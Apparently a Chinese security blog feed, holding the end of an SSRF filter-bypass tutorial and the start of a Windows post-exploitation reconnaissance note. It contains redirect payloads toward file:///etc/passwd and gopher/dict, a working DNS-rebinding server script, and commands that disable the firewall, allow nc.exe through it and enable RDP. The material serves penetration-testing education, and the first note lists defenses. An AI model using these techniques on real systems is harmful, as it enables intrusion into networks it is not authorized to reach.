title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li></ul><p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>16进制整数格式：0xC0A80001</li><li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li></ul><p>其他特殊形式：</p><ul><li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li><li>0.0.0.0可以直接访问到本地；</li></ul><h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p><ul><li>10.0.0.1.xip.io</li><li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li><li>mysite.10.0.0.1.xip.io</li><li>foo.bar.10.0.0.1.xip.io</li></ul><h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p></blockquote><h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p></blockquote><h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p></blockquote><p>跳转常见的结合协议的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p><p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p><h4 id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p><p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p><h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p><p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p><p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p><p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p><p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p><h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p><h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p><h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul><li>Apache Hadoop远程命令执行</li><li>axis2-admin部署Server命令执行</li><li>Confluence SSRF</li><li>counchdb WEB API远程命令执行</li><li>dict</li><li>docker API远程命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>ftp / ftps（FTP爆破）</li><li>glassfish任意文件读取和war文件部署间接命令执行</li><li>gopher</li><li>HFS远程命令执行</li><li>http、https</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>Java调试接口命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Jenkins Scripts接口命令执行</li><li>ldap</li><li>mongodb</li><li>php_fpm/fastcgi 命令执行</li><li>rtsp - smb/smbs（连接SMB）</li><li>sftp</li><li>ShellShock命令执行</li><li>Struts2 RCE</li><li>telnet</li><li>tftp（UDP协议扩展）</li><li>tomcat命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>zentoPMS远程命令执行</li></ul><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li>限制协议为http/https，禁用不必要的协议；</li><li>尽量禁止30x跳转；</li><li>设置URL白名单或限制内网IP、限制请求的端口等；</li><li>统一错误信息；</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p><p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SSRF" scheme="https://www.mi1k7ea.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之本机信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/02/27/内网信息收集之本机信息收集/</id>
    <published>2020-02-27T13:49:40.000Z</published>
    <updated>2020-03-08T13:18:45.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-手动收集信息"><a href="#0x01-手动收集信息" class="headerlink" title="0x01 手动收集信息"></a>0x01 手动收集信息</h2><p>本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令可查看IP地址、DNS服务器、主机名、域名等信息：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/1.png" alt=""></p><h3 id="查询操作系统及软件信息"><a href="#查询操作系统及软件信息" class="headerlink" title="查询操作系统及软件信息"></a>查询操作系统及软件信息</h3><h4 id="查询操作系统名称和版本信息"><a href="#查询操作系统名称和版本信息" class="headerlink" title="查询操作系统名称和版本信息"></a>查询操作系统名称和版本信息</h4><p>分英文版和中文版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">或</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/2.png" alt=""></p><h4 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/3.png" alt=""></p><h4 id="查看安装的软件及版本、路径等"><a href="#查看安装的软件及版本、路径等" class="headerlink" title="查看安装的软件及版本、路径等"></a>查看安装的软件及版本、路径等</h4><p>利用wmic命令将结果输出到文本文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/4.png" alt=""></p><p>利用PowerShell命令收集软件的版本信息（当然如果已在PowerShell终端，则直接输入双引号里的命令即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/5.png" alt=""></p><h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/6.png" alt=""></p><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p>该命令可以查看当前进程列表和进程用户，分析软件、客户端邮件、VPN和杀毒软件等进程：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/7.png" alt=""></p><p>如下命令查看进程信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/8.png" alt=""></p><h4 id="常见杀毒软件的进程"><a href="#常见杀毒软件的进程" class="headerlink" title="常见杀毒软件的进程"></a>常见杀毒软件的进程</h4><p>如下表：</p><table><thead><tr><th>进程</th><th>软件名称</th></tr></thead><tbody><tr><td>360SD.EXE</td><td>360杀毒</td></tr><tr><td>360TRAY.EXE</td><td>360实时保护</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360主动防御</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山卫士</td></tr><tr><td>SAFEDOGUPDATECENTER.EXE</td><td>服务器安全狗</td></tr><tr><td>MCAFEE MCSHIELD.EXE</td><td>迈克菲杀毒软件</td></tr><tr><td>EGUI.EXE</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>卡巴斯基</td></tr><tr><td>AVGUARD.EXE</td><td>小红伞</td></tr><tr><td>BDAGENT.EXE</td><td>BITDEFENDER</td></tr></tbody></table><h3 id="查询启动程序信息"><a href="#查询启动程序信息" class="headerlink" title="查询启动程序信息"></a>查询启动程序信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/9.png" alt=""></p><h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a>查询计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/10.png" alt=""></p><h3 id="查询主机开机时间"><a href="#查询主机开机时间" class="headerlink" title="查询主机开机时间"></a>查询主机开机时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/11.png" alt=""></p><h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/12.png" alt=""></p><p>通过分析本机用户列表，可以得出内网机子的命名规则，特别是个人及其的名称，可以用来推测整个域的用户命名方式。</p><p>通过以下命令获取本地管理员（通常包含域用户）信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>可以看到，本地管理员有两个用户和一个组，默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。如图：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/13.png" alt=""></p><p>执行如下命令查看当前在线用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/14.png" alt=""></p><h3 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/15.png" alt=""></p><h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞。</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/16.png" alt=""></p><p>使用wmic命令查看安装在系统中的补丁，包括补丁的名称、描述、ID、安装时间等信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/17.png" alt=""></p><h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p>该命令可查看本机共享列表和可访问的域共享列表（域共享在很多时候是相同的）：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/18.png" alt=""></p><p>利用wmic命令查找共享列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/19.png" alt=""></p><h3 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/20.png" alt=""></p><p><img src="/2020/02/27/内网信息收集之本机信息收集/21.png" alt=""></p><h3 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows Server 2003及之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/22.png" alt=""></p><h4 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h4><p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本，情况如下。</p><p>允许指定程序进入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许指定程序退出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许3389端口放行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h4 id="自定义防火墙日志的储存位置"><a href="#自定义防火墙日志的储存位置" class="headerlink" title="自定义防火墙日志的储存位置"></a>自定义防火墙日志的储存位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h3 id="查询代理配置情况"><a href="#查询代理配置情况" class="headerlink" title="查询代理配置情况"></a>查询代理配置情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>这里我本地是没开代理端口的：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/24.png" alt=""></p><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><h4 id="查看远程连接端口"><a href="#查看远程连接端口" class="headerlink" title="查看远程连接端口"></a>查看远程连接端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</span><br></pre></td></tr></table></figure><p>在命令行环境中执行注册表查询语句，连接的端口为0xd3d，转换后为3389：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/23.png" alt=""></p><h4 id="在Windows-Server-2003中开启3389端口"><a href="#在Windows-Server-2003中开启3389端口" class="headerlink" title="在Windows Server 2003中开启3389端口"></a>在Windows Server 2003中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="在Windows Server 2008和Windows Server 2012中开启3389端口"></a>在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h2 id="0x02-自动收集信息"><a href="#0x02-自动收集信息" 